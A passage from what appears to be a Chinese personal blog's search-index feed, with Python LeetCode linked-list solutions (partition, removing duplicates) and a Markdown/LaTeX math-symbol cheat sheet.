class="number">3</span></span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.partition(new_a,x)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 2, 4, 3, 5]</code></pre><ul><li>简化</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span><span class="params">(self, head: ListNode, x: int)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="comment"># before_x构造小于x的节点链表,利用头结点，也即哑结点</span></span><br><span class="line">        before_x = ListNode(<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># after_x 构造大于x的结点链表</span></span><br><span class="line">        after_x=ListNode(<span class="number">-1</span>)</span><br><span class="line">        b=before_x</span><br><span class="line">        a=after_x</span><br><span class="line">        <span class="comment"># 遍历head</span></span><br><span class="line">        <span class="keyword">while</span> head:</span><br><span class="line">            <span class="keyword">if</span> head.val&lt;x:</span><br><span class="line">                b.next=head</span><br><span class="line">                b=b.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a.next=head</span><br><span class="line">                a=a.next</span><br><span class="line">            head=head.next</span><br><span class="line">        a.next = <span class="literal">None</span></span><br><span class="line">        b.next=after_x.next</span><br><span class="line">        <span class="keyword">return</span> before_x.next</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line">    x=<span class="number">3</span></span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.partition(new_a,x)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 2, 4, 3, 5]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【杂项】01-MarkDown公式大全</title>
      <link href="2020/11/15/%E6%9D%82%E9%A1%B9-01-markdown%E5%85%AC%E5%BC%8F%E5%A4%A7%E5%85%A8/"/>
      <url>2020/11/15/%E6%9D%82%E9%A1%B9-01-markdown%E5%85%AC%E5%BC%8F%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>markdown公式符号大全。</p><a id="more"></a><h2 id="上下标"><a href="#上下标" class="headerlink" title="上下标"></a>上下标</h2><ul><li>$a_0$，$a_{pre}\Longrightarrow$a_0，a_{pre}</li><li>$a^0，a^{[0]}\Longrightarrow$a^0，a^{[0]}</li></ul><h2 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h2><ul><li>$(,)\Longrightarrow$(,)</li><li>$[,]\Longrightarrow$[,]</li><li>$\langle,\rangle\Longrightarrow$\langle,\rangle</li><li>$\lvert,\rvert \Longrightarrow$\lvert,\rvert</li><li>$\lVert,\rVert\Longrightarrow$ \lVert, \rVert</li><li>$\lbrace, \rbrace\Longrightarrow$\lbrace, \rbrace 或 \{, \}</li></ul><h3 id="增大括号方法"><a href="#增大括号方法" class="headerlink" title="增大括号方法"></a>增大括号方法</h3><ul><li>$(x)\Longrightarrow$(x)</li><li>$\big( x \big)\Longrightarrow$\big( x \big)</li><li>$\Big( x \Big)\Longrightarrow$\Big( x \Big)</li><li>$\bigg( x \bigg)\Longrightarrow$\bigg( x \bigg)</li><li>$\Bigg( x \Bigg)\Longrightarrow$\Bigg( x \Bigg)</li></ul><h3 id="其他的大括号"><a href="#其他的大括号" class="headerlink" title="其他的大括号"></a>其他的大括号</h3><ul><li>$\Bigg(\bigg(\Big(\big((x)\big)\Big)\bigg)\Bigg)\Longrightarrow$\Bigg(\bigg(\Big(\big((x)\big)\Big)\bigg)\Bigg)</li><li>$\Bigg[\bigg[\Big[\big[[x]\big]\Big]\bigg]\Bigg]\Longrightarrow$\Bigg[\bigg[\Big[\big[[x]\big]\Big]\bigg]\Bigg]</li><li>$\Bigg \langle \bigg \langle \Big \langle\big\langle\langle x \rangle \big \rangle\Big\rangle\bigg\rangle\Bigg\rangle\Longrightarrow$\Bigg \langle \bigg \langle \Big \langle\big\langle\langle x \rangle \big \rangle\Big\rangle\bigg\rangle\Bigg\rangle</li><li>$\Bigg\lvert\bigg\lvert\Big\lvert\big\lvert\lvert x \rvert\big\rvert\Big\rvert\bigg\rvert\Bigg\rvert\Longrightarrow$\Bigg\lvert\bigg\lvert\Big\lvert\big\lvert\lvert x \rvert\big\rvert\Big\rvert\bigg\rvert\Bigg\rvert</li><li>$\Bigg\lVert\bigg\lVert\Big\lVert\big\lVert\lVert x \rVert\big\rVert\Big\rVert\bigg\rVert\Bigg\rVert\Longrightarrow$\Bigg\lVert\bigg\lVert\Big\lVert\big\lVert\lVert x \rVert\big\rVert\Big\rVert\bigg\rVert\Bigg\rVert</li></ul><h3 id="运算括号"><a href="#运算括号" class="headerlink" title="运算括号"></a>运算括号</h3><ul><li>$\lceil \frac{x}{2} \rceil\Longrightarrow$\lceil \frac{x}{2} \rceil</li><li>$\lfloor x \rfloor\Longrightarrow$\lfloor x \rfloor</li><li>$\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \rbrace\Longrightarrow$\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \rbrace</li><li>$\left\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \right\rbrace\Longrightarrow$\left\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \right\rbrace</li></ul><h2 id="分数"><a href="#分数" class="headerlink" title="分数"></a>分数</h2><ul><li>$\frac{a}{b}\Longrightarrow$\frac{a}{b}</li></ul><h2 id="开方"><a href="#开方" class="headerlink" title="开方"></a>开方</h2><ul><li>$\sqrt{a + b}\Longrightarrow$\sqrt{a + b}</li><li>$\sqrt[n]{a + b}\Longrightarrow$\sqrt[n]{a + b}</li></ul><h2 id="累加-累乘"><a href="#累加-累乘" class="headerlink" title="累加/累乘"></a>累加/累乘</h2><ul><li>$\sum_{i = 0}^{n}\frac{1}{i^2}\Longrightarrow$\sum_{i = 0}^{n}\frac{1}{i^2}</li><li>$\prod_{i = 0}^{n}\frac{1}{i^2}\Longrightarrow$\prod_{i = 0}^{n}\frac{1}{i^2}</li></ul><h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><ul><li>$\sin\Longrightarrow$\sin</li><li>$\cos\Longrightarrow$\cos</li><li>$\tan\Longrightarrow$\tan</li><li>$\cot\Longrightarrow$\cot</li><li>$\cot\Longrightarrow$\cot</li><li>$\csc\Longrightarrow$\csc</li><li>$\bot\Longrightarrow$\bot</li><li>$\angle\Longrightarrow$\angle</li><li>$40^\circ\Longrightarrow$40^\circ</li></ul><h2 id="对数函数"><a href="#对数函数" class="headerlink" title="对数函数"></a>对数函数</h2><ul><li>$\ln{a + b}\Longrightarrow$\ln{a + b}</li><li>$\log_{a}^{b}\Longrightarrow$\log_{a}^{b}</li><li>$\lg{a + b}\Longrightarrow$\lg{a + b}</li></ul><h2 id="二元运算符"><a href="#二元运算符" class="headerlink" title="二元运算符"></a>二元运算符</h2><ul><li>$\pm\Longrightarrow$\pm</li><li>$\mp\Longrightarrow$\mp</li><li>$\times\Longrightarrow$\times</li><li>$\div\Longrightarrow$\div</li><li>$\ast\Longrightarrow$\ast</li><li>$\star\Longrightarrow$\star</li><li>$\mid\Longrightarrow$\mid</li><li>$\nmid\Longrightarrow$\nmid</li><li>$\circ\Longrightarrow$\circ</li><li>$\bullet\Longrightarrow$\bullet</li><li>$\cdot\Longrightarrow$\cdot</li><li>$\wr\Longrightarrow$\wr</li><li>$\diamond    \Longrightarrow$\diamond    </li><li>$\Diamond\Longrightarrow$\Diamond</li><li>$\triangle\Longrightarrow$\triangle</li><li>$\bigtriangleup\Longrightarrow$\bigtriangleup</li><li>$\bigtriangledown\Longrightarrow$\bigtriangledown</li><li>$\triangleleft\Longrightarrow$\triangleleft</li><li>$\triangleright\Longrightarrow$\triangleright</li><li>$\lhd\Longrightarrow$\lhd</li><li>$\rhd\Longrightarrow$\rhd</li><li>$\unlhd\Longrightarrow$\unlhd</li><li>$\unrhd\Longrightarrow$\unrhd</li><li>$\circ\Longrightarrow$\circ</li><li>$\bigcirc\Longrightarrow$\bigcirc</li><li>$\odot\Longrightarrow$\odot</li><li>$\bigodot\Longrightarrow$\bigodot</li><li>$\oslash\Longrightarrow$\oslash</li><li>$\ominus\Longrightarrow$\ominus</li><li>$\otimes\Longrightarrow$\otimes</li><li>$\bigotimes\Longrightarrow$\bigotimes</li><li>$\oplus\Longrightarrow$\oplus</li><li>$\bigoplus\Longrightarrow$\bigoplus</li><li>$\dagger\Longrightarrow$\dagger</li><li>$\ddagger\Longrightarrow$\ddagger</li><li>$\amalg\Longrightarrow$\amalg</li></ul><h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><ul><li>$\leq\Longrightarrow$\leq</li><li>$\geq\Longrightarrow$\geq</li><li>$\equiv\Longrightarrow$\equiv</li><li>$\models\Longrightarrow$\models</li><li>$\prec\Longrightarrow$\prec</li><li>$\succ\Longrightarrow$\succ</li><li>$\sim\Longrightarrow$\sim</li><li>$\perp\Longrightarrow$\perp</li><li>$\preceq\Longrightarrow$\preceq</li><li>$\succeq\Longrightarrow$\succeq</li><li>$\simeq\Longrightarrow$\simeq</li><li>$\mid\Longrightarrow$\mid</li><li>$\ll\Longrightarrow$\ll</li><li>$\gg\Longrightarrow$\gg</li><li>$\asymp\Longrightarrow$\asymp</li><li>$\parallel\Longrightarrow$\parallel</li><li>$\approx\Longrightarrow$\approx</li><li>$\cong\Longrightarrow$\cong</li><li>$\neq\Longrightarrow$\neq</li><li>$\doteq\Longrightarrow$\doteq</li><li>$\propto\Longrightarrow$\propto</li><li>$\bowtie\Longrightarrow$\bowtie</li><li>$\Join\Longrightarrow$\Join</li><li>$\smile\Longrightarrow$\smile</li><li>$\frown\Longrightarrow$\frown</li><li>$\vdash\Longrightarrow$\vdash</li><li>$\dashv\Longrightarrow$\dashv</li></ul><h2 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h2><ul><li>$\lim\Longrightarrow$\lim</li><li>$\rightarrow\Longrightarrow$\rightarrow</li><li>$\infty\Longrightarrow$\infty</li><li>$\lim_{n\rightarrow+\infty}n\Longrightarrow$\lim_{n\rightarrow+\infty}n</li></ul><h2 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h2><ul><li>$\vec{a}\Longrightarrow$\vec{a}</li></ul><h2 id="箭头"><a href="#箭头" class="headerlink" title="箭头"></a>箭头</h2><ul><li>$\uparrow\Longrightarrow$\uparrow</li><li>$\downarrow\Longrightarrow$\downarrow</li><li>$\updownarrow\Longrightarrow$\updownarrow</li><li>$\Uparrow\Longrightarrow$\Uparrow</li><li>$\Downarrow\Longrightarrow$\Downarrow</li><li>$\Updownarrow\Longrightarrow$\Updownarrow</li><li>$\rightarrow\Longrightarrow$\rightarrow</li><li>$\leftarrow\Longrightarrow$\leftarrow</li><li>$\leftrightarrow\Longrightarrow$\leftrightarrow</li><li>$\Rightarrow\Longrightarrow$\Rightarrow</li><li>$\Leftarrow\Longrightarrow$\Leftarrow</li><li>$\Leftrightarrow\Longrightarrow$\Leftrightarrow</li><li>$\longrightarrow\Longrightarrow$\longrightarrow</li><li>$\longleftarrow\Longrightarrow$\longleftarrow</li><li>$\longleftrightarrow\Longrightarrow$\longleftrightarrow</li><li>$\Longrightarrow\Longrightarrow$\Longrightarrow</li><li>$\Longleftarrow\Longrightarrow$\Longleftarrow</li><li>$\Longleftrightarrow\Longrightarrow$\Longleftrightarrow</li><li>$\mapsto\Longrightarrow$\mapsto</li><li>$\longmapsto\Longrightarrow$\longmapsto</li><li>$\hookleftarrow\Longrightarrow$\hookleftarrow</li><li>$\hookrightarrow\Longrightarrow$\hookrightarrow</li><li>$\rightharpoonup\Longrightarrow$\rightharpoonup</li><li>$\leftharpoondown\Longrightarrow$\leftharpoondown</li><li>$\rightleftharpoons\Longrightarrow$\rightleftharpoons</li><li>$\leftharpoonup\Longrightarrow$\leftharpoonup</li><li>$\rightharpoondown\Longrightarrow$\rightharpoondown</li><li>$\leadsto\Longrightarrow$\leadsto</li><li>$\nearrow\Longrightarrow$\nearrow</li><li>$\searrow\Longrightarrow$\searrow</li><li>$\swarrow\Longrightarrow$\swarrow</li><li>$\nwarrow\Longrightarrow$\nwarrow</li></ul><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><ul><li>$\emptyset\Longrightarrow$\emptyset</li><li>$\in\Longrightarrow$\in</li><li>$\in\Longrightarrow$\in</li><li>$\notin\Longrightarrow$\notin</li><li>$\subset\Longrightarrow$\subset</li><li>$\supset\Longrightarrow$\supset</li><li>$\not\subset\Longrightarrow$\not\subset</li><li>$\subseteq\Longrightarrow$\subseteq</li><li>$\supseteq\Longrightarrow$\supseteq</li><li>$\cup\Longrightarrow$\cup</li><li>$\bigcup\Longrightarrow$\bigcup</li><li>$\cap\Longrightarrow$\cap</li><li>$\bigcap\Longrightarrow$\bigcap</li><li>$\uplus\Longrightarrow$\uplus</li><li>$\biguplus\Longrightarrow$\biguplus</li><li>$\sqsubset\Longrightarrow$\sqsubset</li><li>$\sqsupset\Longrightarrow$\sqsupset</li><li>$\sqcap\Longrightarrow$\sqcap</li><li>$\sqsubseteq\Longrightarrow$\sqsubseteq</li><li>$\sqsupseteq\Longrightarrow$\sqsupseteq</li><li>$\vee\Longrightarrow$\vee</li><li>$\wedge\Longrightarrow$\wedge</li><li>$\setminus\Longrightarrow$\setminus</li></ul><h2 id="微积分"><a href="#微积分" class="headerlink" title="微积分"></a>微积分</h2><ul><li>$\prime\Longrightarrow$\prime</li><li>$\int\Longrightarrow$\int</li><li>$\iint\Longrightarrow$\iint</li><li>$\iiint\Longrightarrow$\iiint</li><li>$\oint\Longrightarrow$\oint</li><li>$\nabla\Longrightarrow$\nabla</li><li>$\int_0^2 x^2 dx\Longrightarrow$\int_0^2 x^2 dx</li></ul><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ul><li>$\because\Longrightarrow$\because</li><li>$\therefore\Longrightarrow$\therefore</li><li>$\forall\Longrightarrow$\forall</li><li>$\exists\Longrightarrow$\exists</li><li>$\vee\Longrightarrow$\vee</li><li>$\wedge\Longrightarrow$\wedge</li><li>$\bigvee\Longrightarrow$\bigvee</li><li>$\bigwedge\Longrightarrow$\bigwedge</li></ul><h2 id="上下标符号"><a href="#上下标符号" class="headerlink" title="上下标符号"></a>上下标符号</h2><ul><li>$\bar{a}\Longrightarrow$\bar{a}</li><li>$\acute\Longrightarrow$\acute</li><li>$\breve{a}\Longrightarrow$\breve{a}</li><li>$\grave{a}\Longrightarrow$\grave{a}</li><li>$\dot{a}\Longrightarrow$\dot{a}</li><li>$\ddot{a}\Longrightarrow$\ddot{a}</li><li>$\hat{a}\Longrightarrow$\hat{a}</li><li>$\check{a}\Longrightarrow$\check{a}</li><li>$\breve{a}\Longrightarrow$\breve{a}</li><li>$\tilde{a}\Longrightarrow$\tilde{a}</li><li>$\vec{a}\Longrightarrow$\vec{a}</li><li>$\overline{a + b + c + d}\Longrightarrow$\overline{a + b + c + d}</li><li>$\underline{a + b + c + d}\Longrightarrow$\underline{a + b + c + d}</li><li>$\overbrace{a + b + c + d}\Longrightarrow$\overbrace{a + b + c + d}</li><li>$\underline{a + b + c + d}\Longrightarrow$\underline{a + b + c + d}</li><li>$\overbrace{a + \underbrace{b + c}<em>{1.0} + d}^{2.0}\Longrightarrow$\overbrace{a + \underbrace{b + c}</em>{1.0} + d}^{2.0}</li></ul><h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><ul><li><p>$\Gamma\Longrightarrow$\Gamma</p></li><li><p>$\Delta\Longrightarrow$\Delta</p></li><li><p>$\Theta\Longrightarrow$\Theta</p></li><li><p>$\Lambda\Longrightarrow$\Lambda</p></li><li><p>$\Xi\Longrightarrow$\Xi</p></li><li><p>$\Pi\Longrightarrow$\Pi</p></li><li><p>$\Sigma\Longrightarrow$\Sigma</p></li><li><p>$\Upsilon\Longrightarrow$\Upsilon</p></li><li><p>$\Phi\Longrightarrow$\Phi</p></li><li><p>$\Psi\Longrightarrow$\Psi</p></li><li><p>$\Omega\Longrightarrow$\Omega</p></li><li><p>$\alpha\Longrightarrow$\alpha</p></li><li><p>$\beta\Longrightarrow$\beta</p></li><li><p>$\gamma\Longrightarrow$\gamma</p></li><li><p>$\delta\Longrightarrow$\delta</p></li><li><p>$\epsilon\Longrightarrow$\epsilon</p></li><li><p>$\varepsilon\Longrightarrow$\varepsilon</p></li><li><p>$\zeta\Longrightarrow$\zeta</p></li><li><p>$\eta\Longrightarrow$\eta</p></li><li><p>$\theta\Longrightarrow$\theta</p></li><li><p>$\iota\Longrightarrow$\iota</p></li><li><p>$\kappa\Longrightarrow$\kappa</p></li><li><p>$\lambda\Longrightarrow$\lambda</p></li><li><p>$\mu\Longrightarrow$\mu</p></li><li><p>$\nu\Longrightarrow$\nu</p></li><li><p>$\xi\Longrightarrow$\xi</p></li><li><p>$\omicron\Longrightarrow$\omicron</p></li><li><p>$\pi\Longrightarrow$\pi</p></li><li><p>$\rho\Longrightarrow$\rho</p></li><li><p>$\sigma\Longrightarrow$\sigma</p></li><li><p>$\tau\Longrightarrow$\tau</p></li><li><p>$\upsilon\Longrightarrow$\upsilon</p></li><li><p>$\phi\Longrightarrow$\phi</p></li><li><p>$\varphi\Longrightarrow$\varphi</p></li><li><p>$\chi\Longrightarrow$\chi</p></li><li><p>$\psi\Longrightarrow$\psi</p></li><li><p>$\omega\Longrightarrow$\omega</p></li></ul><h2 id="省略号"><a href="#省略号" class="headerlink" title="省略号"></a>省略号</h2><ul><li>$\dots\Longrightarrow$\dots</li><li>$\ldots\Longrightarrow$\ldots</li><li>$\cdots\Longrightarrow$\cdots</li><li>$\vdots\Longrightarrow$\vdots</li><li>$\ddots\Longrightarrow$\ddots</li></ul><p>$$<br>x_1, x_2, \dots, x_n \quad \quad 1, 2, \cdots, n \quad \quad \vdots \quad\quad \ddots<br>$$</p><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><ul><li>$123\quad123\Longrightarrow$123\quad123</li><li>$123\qquad123\Longrightarrow$123\qquad123</li></ul><h2 id="其他符号"><a href="#其他符号" class="headerlink" title="其他符号"></a>其他符号</h2><ul><li>$\aleph\Longrightarrow$\aleph</li><li>$\hbar\Longrightarrow$\hbar</li><li>$\imath\Longrightarrow$\imath</li><li>$\jmath\Longrightarrow$\jmath</li><li>$\ell\Longrightarrow$\ell</li><li>$\wp\Longrightarrow$\wp</li><li>$\Re\Longrightarrow$\Re</li><li>$\Im\Longrightarrow$\Im</li><li>$\mho\Longrightarrow$\mho</li><li>$\nabla\Longrightarrow$\nabla</li><li>$\surd\Longrightarrow$\surd</li><li>$\top\Longrightarrow$\top</li><li>$\bot\Longrightarrow$\bot</li><li>$\neg\Longrightarrow$\neg</li><li>$\flat\Longrightarrow$\flat</li><li>$\natural\Longrightarrow$\natural</li><li>$\sharp\Longrightarrow$\sharp</li><li>$\backslash\Longrightarrow$\backslash</li><li>$\partial\Longrightarrow$\partial</li><li>$\Box\Longrightarrow$\Box</li><li>$\clubsuit\Longrightarrow$\clubsuit</li><li>$\diamondsuit\Longrightarrow$\diamondsuit</li><li>$\heartsuit\Longrightarrow$\heartsuit</li><li>$\spadesuit\Longrightarrow$\spadesuit</li></ul><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><h3 id="分支公式"><a href="#分支公式" class="headerlink" title="分支公式"></a>分支公式</h3><p>$$<br>y=<br>\begin{cases}<br>-x,\quad x\leq 0\<br>x, \quad x&gt;0<br>\end{cases}<br>\tag{1}<br>$$</p><p><code>$$y=\begin{cases}-x,\quad x\leq 0\\x, \quad x&gt;0\end{cases}\tag{1}$$</code></p><h3 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h3><ul><li>不带括号</li></ul><p>$$<br>\begin{matrix}<br>1 &amp; 2 &amp; 3\<br>4 &amp; 5 &amp; 6 \<br>7 &amp; 8 &amp; 9<br>\end{matrix}<br>\tag{1}<br>$$</p><p><code>$$\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{matrix}\tag{1}$$</code></p><ul><li><p>括号<br>$$\left(<br>\begin{matrix}<br>1 &amp; 2 &amp; 3\<br>4 &amp; 5 &amp; 6 \<br>7 &amp; 8 &amp; 9<br>\end{matrix}<br>\right)<br>\tag{2}$$<br><code>$$\left(\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{matrix}\right)\tag{2}$$</code></p></li><li><p>中括号<br>$$\left[<br>\begin{matrix}<br>1 &amp; 2 &amp; 3\<br>4 &amp; 5 &amp; 6 \<br>7 &amp; 8 &amp; 9<br>\end{matrix}<br>\right]<br>\tag{3}$$<br><code>$$\left[\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{matrix}\right]\tag{3}$$</code></p></li><li><p>大括号</p></li></ul><p>$$\left{<br>\begin{matrix}<br>1 &amp; 2 &amp; 3\<br>4 &amp; 5 &amp; 6 \<br>7 &amp; 8 &amp; 9<br>\end{matrix}<br>\right}<br>\tag{4}$$</p><p><code>$$\left\{\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{matrix}\right\}\tag{4}$$</code></p><ul><li><p>带省略号<br>$$<br>\left[<br>\begin{matrix}<br>a &amp; b &amp; \cdots &amp; a\<br>b &amp; b &amp; \cdots &amp; b\<br>\vdots &amp; \vdots &amp; \ddots &amp; \vdots\<br>c &amp; c &amp; \cdots &amp; c<br>\end{matrix}<br>\right]<br>\tag{5}<br>$$<br><code>$$\left[\begin{matrix}a &amp; b &amp; \cdots &amp; a\\b &amp; b &amp; \cdots &amp; b\\\vdots &amp; \vdots &amp; \ddots &amp; \vdots\\c &amp; c &amp; \cdots &amp; c\end{matrix}\right]\tag{5}$$</code></p></li><li><p>带横竖线分割的矩阵<br>$$<br>\left[<br>\begin{array}{c|cc}<br>1 &amp; 2 &amp; 3 \<br>4 &amp; 5 &amp; 6 \<br>7 &amp; 8 &amp; 9<br>\end{array}<br>\right]<br>\tag{6}$$</p></li></ul><p><code>$$\left[\begin{array}{c|cc}1 &amp; 2 &amp; 3 \\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{array}\right]\tag{6}$$</code></p><ul><li>横线用 \hline 分割<br>$$\left[<br>  \begin{array}{c|cc}<br>  1 &amp; 2 &amp; 3 \ \hline<br>  4 &amp; 5 &amp; 6 \<br>  7 &amp; 8 &amp; 9<br>  \end{array}<br>\right]<br>\tag{7}$$</li></ul><p><code>$$\left[    \begin{array}{c|cc}    1 &amp; 2 &amp; 3 \\ \hline    4 &amp; 5 &amp; 6 \\    7 &amp; 8 &amp; 9    \end{array}\right]\tag{7}$$</code></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown公式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】83. 删除排序链表中的重复元素</title>
      <link href="2020/11/15/LeetCode-A-%E9%93%BE%E8%A1%A8-83.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/"/>
      <url>2020/11/15/LeetCode-A-%E9%93%BE%E8%A1%A8-83.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<p>将有序链表中重复出现的元素删除，每个元素出现一次。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。</p><p>示例</p><pre><code>示例 1:输入: 1-&gt;1-&gt;2输出: 1-&gt;2示例 2:输入: 1-&gt;1-&gt;2-&gt;3-&gt;3输出: 1-&gt;2-&gt;3</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>仅用一个指针</p><pre><code>通过将结点的值与它之后的结点进行比较来确定它是否为重复结点。如果它是重复的，我们更改当前结点的 next 指针，以便它跳过下一个结点并直接指向下一个结点之后的结点。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (head <span class="keyword">and</span> head.next):</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        current=head</span><br><span class="line">        <span class="keyword">while</span> current!=<span class="literal">None</span> <span class="keyword">and</span> current.next!=<span 